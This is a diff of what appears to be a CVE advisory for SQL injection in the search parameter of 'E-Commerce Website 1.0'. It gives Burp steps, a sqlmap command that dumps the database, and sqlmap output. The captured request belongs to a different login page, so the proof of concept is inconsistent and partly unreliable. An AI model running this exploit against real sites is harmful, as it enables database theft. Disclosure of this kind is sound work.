@@ -14,15 +14,11 @@ E-Commerce Website 1.0 allows SQL Injection via parameter 'search' in "/Electric
 Exploiting this issue could allow an attacker to compromise the application, access or modify data,  or exploit latest vulnerabilities in the underlying database.
 
 ## Proof of Concept:
-+Go to the Search Product textbox: "http://localhost/Electricks/Electricks-shop/index_search.php"
-+Fill Enter product name and search.
-+Intercept the request via Burp Suite and send to Repeater.
-+Copy and paste the request to a "r.txt" file.
-+Use sqlmap to exploit.
-
----
-
-Captured Burp request:
++ Go to the Search Product textbox: "http://localhost/Electricks/Electricks-shop/index_search.php"
++ Fill Enter product name and search.
++ Intercept the request via Burp Suite and send to Repeater.
++ Copy and paste the request to a "r.txt" file.
++ Captured Burp request:
 ```
 POST /libsystem/admin/login.php HTTP/1.1
 Host: localhost
@@ -38,9 +34,7 @@ User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
 username=admin&login=&password=Pass
 ```
 
----
-
-In sqlmap, use 'search' parameter to dump the database. 
++ Use sqlmap to exploit. In sqlmap, use 'search' parameter to dump the database. 
 
 `python sqlmap.py -r r.txt -p search --risk 3 --level 5 --threads 1 --random-agent tamper=between,randomcase --proxy="http://127.0.0.1:8080" --dbms mysql --batch --current-db`
 
@@ -70,6 +64,6 @@ back-end DBMS: MySQL >= 5.0 (MariaDB fork)
 current database: 'electricks'
 ```
 
-current database: `electricks`
++ current database: `electricks`
 
 ![1](https://github.com/h4md153v63n/CVEs/assets/5091265/e2d64c21-ad38-4af7-977c-d140d0642a28)
